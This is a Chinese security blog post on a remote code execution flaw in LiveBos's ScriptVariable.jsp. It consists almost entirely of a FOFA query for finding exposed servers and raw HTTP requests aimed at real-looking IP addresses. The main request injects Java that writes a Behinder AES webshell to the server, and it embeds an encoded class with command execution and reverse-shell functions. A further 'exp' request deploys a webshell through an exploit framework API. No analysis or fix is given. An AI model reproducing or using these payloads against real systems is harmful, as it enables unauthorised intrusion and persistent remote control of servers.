+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Chinchin&#39;s blog"><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">文章</a><a class="menu-item" href="/tags/" title="">标签</a><a class="menu-item" href="/categories/" title="">分类</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">LiveBos ScriptVariable.jsp 远程代码执行漏洞</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Chinchin</a>
+</span>&nbsp;<span class="post-category">included in <a href="/categories/2023hw/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>2023hw</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2023-12-08">2023-12-08</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;132 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;One minute&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="true">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#poc">poc</a>
+      <ul>
+        <li><a href="#1">1</a></li>
+        <li><a href="#2">2</a></li>
+        <li><a href="#3">3</a></li>
+      </ul>
+    </li>
+    <li><a href="#exp">exp</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><pre><code>## fofa
+</code></pre>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">body=&#34;LiveBos&#34; || body=&#34;/react/browser/loginBackground.png&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="poc">poc</h2>
+<p>写入冰蝎</p>
+<h3 id="1">1</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /plug-in/common/ScriptVariable.jsp;.css.jsp HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 112.35.7.97:8001
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip
+</span></span><span class="line"><span class="cl">Content-Length: 6577
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">act=put&amp;scope=0&amp;name=gName13&amp;value=content%3Dorg.apache.commons.codec.binary.StringUtils.newString%28java.lang.Class.forName%28%22org.apache.commons.codec.binary.Base64%22%29.newInstance%28%29.decodeBase64%28%22PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4%3D%22%29%2C%22UTF-8%22%29%2B%22%22%3Bbytes%3Djava.lang.Class.forName%28%22org.apache.commons.codec.binary.Base64%22%29.newInstance%28%29.decode%28%22yv66vgAAADEA5AoATgBcCABdCgAcAF4IAF8KABwAYAgAYQoAHABiCgAcAGMIAGQKABwAZQgAZgoAZwBoCgBNAGkIAGoKAE0AawgAbAoAbQBuCgAcAG8IAHAKABwAcQgAcggAcwcAdAoAFwBcCgAXAHUIAHYKABcAdwcAeAgAeQgAeggAewgAfAgAfQoAfgB%2FCgB%2BAIAHAIEKAIIAgwoAJACECACFCgAkAIYKACQAhwoAJACICgCCAIkKAIIAigcAiwoALQB3CACMCgAcAI0IAI4KAH4AjwcAkAoAZwCRCgAzAJIKADMAgwoAggCTCgAzAJMKADMAlAoAlQCWCgCVAJcKAJgAmQoAmACaBQAAAAAAAAAyCgCbAJwKAIIAnQoAMwCeCACfCgAtAKAIAKEIAKIHAKMKAEcAjQoAHACkCgBHAKUKAEcAmggApgcApwcAqAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAAdleGVjdXRlAQAmKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAARleGVjAQAHcmV2ZXJzZQEAOShMamF2YS9sYW5nL1N0cmluZztMamF2YS9sYW5nL0ludGVnZXI7KUxqYXZhL2xhbmcvU3RyaW5nOwEABXdyaXRlAQA4KExqYXZhL2xhbmcvU3RyaW5nO0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZzsBAApTb3VyY2VGaWxlAQAHQzEuamF2YQwATwBQAQAADACpAKoBABBjb21tYW5kIG5vdCBudWxsDACrAKwBAAUjIyMjIwwArQCuDACvALABAAE6DACxALIBACJjb21tYW5kIHJldmVyc2UgaG9zdCBmb3JtYXQgZXJyb3IhBwCzDAC0ALUMAFYAVwEABUBAQEBADABVAFQBAAdvcy5uYW1lBwC2DAC3AFQMALgArAEAA3dpbgwAuQC6AQAEcGluZwEAAi1uAQAXamF2YS9sYW5nL1N0cmluZ0J1aWxkZXIMALsAvAEABSAtbiA0DAC9AKwBABBqYXZhL2xhbmcvU3RyaW5nAQADY21kAQACL2MBAAUgLXQgNAEAAnNoAQACLWMHAL4MAL8AwAwAVQDBAQARamF2YS91dGlsL1NjYW5uZXIHAMIMAMMAxAwATwDFAQACXGEMAMYAxwwAyADJDADKAKwMAMsAxAwAzABQAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEABy9iaW4vc2gMAE8AzQEAB2NtZC5leGUMAFUAzgEAD2phdmEvbmV0L1NvY2tldAwAzwDQDABPANEMANIA0wwA1ADJBwDVDADWANAMANcA0AcA2AwAWADZDADaAFAHANsMANwA3QwA3gDQDADfAFABAB1yZXZlcnNlIGV4ZWN1dGUgZXJyb3IsIG1zZyAtPgwA4ACsAQABIQEAE3JldmVyc2UgZXhlY3V0ZSBvayEBABhqYXZhL2lvL0ZpbGVPdXRwdXRTdHJlYW0MAOEA4gwAWADjAQACb2sBAAJDMQEAEGphdmEvbGFuZy9PYmplY3QBAAZlcXVhbHMBABUoTGphdmEvbGFuZy9PYmplY3Q7KVoBAAR0cmltAQAUKClMamF2YS9sYW5nL1N0cmluZzsBAApzdGFydHNXaXRoAQAVKExqYXZhL2xhbmcvU3RyaW5nOylaAQAHcmVwbGFjZQEARChMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTtMamF2YS9sYW5nL0NoYXJTZXF1ZW5jZTspTGphdmEvbGFuZy9TdHJpbmc7AQAFc3BsaXQBACcoTGphdmEvbGFuZy9TdHJpbmc7KVtMamF2YS9sYW5nL1N0cmluZzsBABFqYXZhL2xhbmcvSW50ZWdlcgEAB3ZhbHVlT2YBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvSW50ZWdlcjsBABBqYXZhL2xhbmcvU3lzdGVtAQALZ2V0UHJvcGVydHkBAAt0b0xvd2VyQ2FzZQEACGNvbnRhaW5zAQAbKExqYXZhL2xhbmcvQ2hhclNlcXVlbmNlOylaAQAGYXBwZW5kAQAtKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1N0cmluZ0J1aWxkZXI7AQAIdG9TdHJpbmcBABFqYXZhL2xhbmcvUnVudGltZQEACmdldFJ1bnRpbWUBABUoKUxqYXZhL2xhbmcvUnVudGltZTsBACgoW0xqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7AQARamF2YS9sYW5nL1Byb2Nlc3MBAA5nZXRJbnB1dFN0cmVhbQEAFygpTGphdmEvaW8vSW5wdXRTdHJlYW07AQAYKExqYXZhL2lvL0lucHV0U3RyZWFtOylWAQAMdXNlRGVsaW1pdGVyAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS91dGlsL1NjYW5uZXI7AQAHaGFzTmV4dAEAAygpWgEABG5leHQBAA5nZXRFcnJvclN0cmVhbQEAB2Rlc3Ryb3kBABUoTGphdmEvbGFuZy9TdHJpbmc7KVYBACcoTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2VzczsBAAhpbnRWYWx1ZQEAAygpSQEAFihMamF2YS9sYW5nL1N0cmluZztJKVYBAA9nZXRPdXRwdXRTdHJlYW0BABgoKUxqYXZhL2lvL091dHB1dFN0cmVhbTsBAAhpc0Nsb3NlZAEAE2phdmEvaW8vSW5wdXRTdHJlYW0BAAlhdmFpbGFibGUBAARyZWFkAQAUamF2YS9pby9PdXRwdXRTdHJlYW0BAAQoSSlWAQAFZmx1c2gBABBqYXZhL2xhbmcvVGhyZWFkAQAFc2xlZXABAAQoSilWAQAJZXhpdFZhbHVlAQAFY2xvc2UBAApnZXRNZXNzYWdlAQAIZ2V0Qnl0ZXMBAAQoKVtCAQAFKFtCKVYAIQBNAE4AAAAAAAUAAQBPAFAAAQBRAAAAHQABAAEAAAAFKrcAAbEAAAABAFIAAAAGAAEAAAANAAEAUwBUAAEAUQAAAI8ABAADAAAAVyvGAAwSAiu2AAOZAAYSBLArtgAFTCsSBrYAB5kAKCsSBhICtgAIEgm2AApNLL4FnwAGEguwKiwDMiwEMrgADLYADbAqKxIGEgK2AAgSDhICtgAItgAPsAAAAAEAUgAAACYACQAAABUADQAWABAAGAAVABkAHgAbACwAHAAyAB0ANQAfAEMAIQABAFUAVAABAFEAAAHOAAQACQAAASoSELgAEbYAEk0rtgAFTAFOAToELBITtgAUmQBAKxIVtgAUmQAgKxIWtgAUmgAXuwAXWbcAGCu2ABkSGrYAGbYAG0wGvQAcWQMSHVNZBBIeU1kFK1M6BKcAPSsSFbYAFJkAICsSFrYAFJoAF7sAF1m3ABgrtgAZEh%2B2ABm2ABtMBr0AHFkDEiBTWQQSIVNZBStTOgS4ACIZBLYAI067ACRZLbYAJbcAJhIntgAoOgUZBbYAKZkACxkFtgAqpwAFEgI6BrsAJFkttgArtwAmEie2ACg6BbsAF1m3ABgZBrYAGRkFtgApmQALGQW2ACqnAAUSArYAGbYAGzoGGQY6By3GAActtgAsGQewOgUZBbYALjoGLcYABy22ACwZBrA6CC3GAActtgAsGQi%2FAAQAkwD%2BAQkALQCTAP4BHQAAAQkBEgEdAAABHQEfAR0AAAABAFIAAAByABwAAAAlAAkAJgAOACcAEAAoABMAKQAcACoALgArAEIALQBZAC8AawAwAH8AMgCTADUAnAA2AK4ANwDCADgA1AA5APoAOgD%2BAD4BAgA%2FAQYAOgEJADsBCwA8ARIAPgEWAD8BGgA8AR0APgEjAD8BJwBBAAEAVgBXAAEAUQAAAYMABAAMAAAA8xIQuAARtgASEhO2ABSaABC7ABxZEi%2B3ADBOpwANuwAcWRIxtwAwTrgAIi22ADI6BLsAM1krLLYANLcANToFGQS2ACU6BhkEtgArOgcZBbYANjoIGQS2ADc6CRkFtgA4OgoZBbYAOZoAYBkGtgA6ngAQGQoZBrYAO7YAPKf%2F7hkHtgA6ngAQGQoZB7YAO7YAPKf%2F7hkItgA6ngAQGQkZCLYAO7YAPKf%2F7hkKtgA9GQm2AD0UAD64AEAZBLYAQVenAAg6C6f%2FnhkEtgAsGQW2AEKnACBOuwAXWbcAGBJDtgAZLbYARLYAGRJFtgAZtgAbsBJGsAACALgAvgDBAC0AAADQANMALQABAFIAAABuABsAAABNABAATgAdAFAAJwBSADAAUwA%2BAFQAUwBVAGEAVgBpAFcAcQBYAH4AWgCGAFsAkwBdAJsAXgCoAGAArQBhALIAYgC4AGQAvgBlAMEAZgDDAGcAxgBpAMsAagDQAG0A0wBrANQAbADwAG4AAQBYAFkAAQBRAAAAWQADAAQAAAAhuwBHWSu3AEhOLSy2AEm2AEottgBLpwAJTi22AC6wEkywAAEAAAAVABgALQABAFIAAAAeAAcAAAB5AAkAegARAHsAFQB%2BABgAfAAZAH0AHgB%2FAAEAWgAAAAIAWw%3D%3D%22%29%3BtheUnsafeMethod%3Djava.lang.Class.forName%28%22sun.misc.Unsafe%22%29.getDeclaredField%28%22theUnsafe%22%29%3BtheUnsafeMethod.setAccessible%28true%29%3Bunsafe%3DtheUnsafeMethod.get%28null%29%3BclassLoader%3Dnew+java.net.URLClassLoader%28java.lang.reflect.Array.newInstance%28java.lang.Class.forName%28%22java.net.URL%22%29%2C+0%29%29%3BprotectionDomain%3Dnew+java.security.ProtectionDomain%28new+java.security.CodeSource%28null%2C+java.lang.reflect.Array.newInstance%28java.lang.Class.forName%28%22java.security.cert.Certificate%22%29%2C+0%29%29%2C+null%2C+classLoader%2C+%5B%5D%29%3Bclz+%3D+unsafe.defineClass%28null%2C+bytes%2C+0%2C+bytes.length%2C+classLoader%2C+protectionDomain%29%3Bj%3Dclz.newInstance%28%29.write%28%22..%2FLiveBOS%2FFormBuilder%2F5aB7Bc80daBC3d56.jsp%22%2C+content%29%2B%22%22%3B
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="2">2</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /plug-in/common/ScriptVariable.jsp;.css.jsp HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 112.35.7.97:8001
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip
+</span></span><span class="line"><span class="cl">Content-Length: 28
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">act=get&amp;scope=0&amp;name=gName13
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="3">3</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /5aB7Bc80daBC3d56.jsp;.css.jsp HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 112.35.7.97:8001
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="exp">exp</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">POST /api/v1/debugExp HTTP/1.1
+</span></span><span class="line"><span class="cl">Content-Type: application/json;charset=UTF-8
+</span></span><span class="line"><span class="cl">Authorization: Basic dXNlcjpwYXNz
+</span></span><span class="line"><span class="cl">host: 82.156.29.211:8365
+</span></span><span class="line"><span class="cl">Connection: close
+</span></span><span class="line"><span class="cl">Content-Length: 207
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">{&#34;hostinfo&#34;:&#34;http://item.tpre.cn:9999&#34;,&#34;vulfile&#34;:&#34;CVD-2023-2800.go&#34;,&#34;expparams&#34;:{&#34;attackType&#34;:&#34;webshell&#34;,&#34;cmd&#34;:&#34;whoami&#34;,&#34;webshell&#34;:&#34;behinder&#34;,&#34;filename&#34;:&#34;abcsj.jsp&#34;,&#34;content&#34;:&#34;&lt;% out.println(\&#34;hello\&#34;);%&gt;&#34;}}
+</span></span></code></pre></td></tr></table>
+</div>
+</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2023-12-08</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="http://example.org/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-title="LiveBos ScriptVariable.jsp 远程代码执行漏洞" data-via="xxxx" data-hashtags="2023hw"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="http://example.org/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-hashtag="2023hw"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Hacker News" data-sharer="hackernews" data-url="http://example.org/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-title="LiveBos ScriptVariable.jsp 远程代码执行漏洞"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Line" data-sharer="line" data-url="http://example.org/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-title="LiveBos ScriptVariable.jsp 远程代码执行漏洞"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on 微博" data-sharer="weibo" data-url="http://example.org/livebos-scriptvariable.jsp-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/" data-title="LiveBos ScriptVariable.jsp 远程代码执行漏洞"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/2023hw/">2023hw</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/livebos-showimage.do-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E/" class="prev" rel="prev" title="LiveBOS ShowImage.do 任意文件读取漏洞"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>LiveBOS ShowImage.do 任意文件读取漏洞</a>
+            <a href="/linux-sudo%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E-cve-2023-22809/" class="next" rel="next" title="Linux sudo权限提升漏洞 CVE-2023-22809">Linux sudo权限提升漏洞 CVE-2023-22809<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Chinchin</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/katex/copy-tex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/typeit/index.umd.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Got it!","link":"Learn more","message":"This website uses Cookies to improve your experience."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"data":{"id-1":"首页","id-2":"首页"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":50,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
